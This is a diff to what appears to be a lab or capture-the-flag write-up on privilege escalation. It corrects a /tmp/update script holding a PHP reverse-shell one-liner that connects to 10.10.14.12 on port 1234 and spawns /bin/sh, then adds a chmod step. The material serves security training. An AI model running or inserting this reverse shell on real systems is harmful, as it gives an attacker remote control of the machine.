@@ -459,7 +459,14 @@ There is a privilege escalation vulnerability with old versions of this software
 To do that, navigate to the /tmp directory and create the file update. In the update file add the following code.
 
 ```text
-#!/bin/bashphp -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+#!/bin/bash
+php -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Then give it execute privileges:
+
+```
+chmod +x /tmp/update
 ```
 
 Set up a listener to receive the reverse shell.
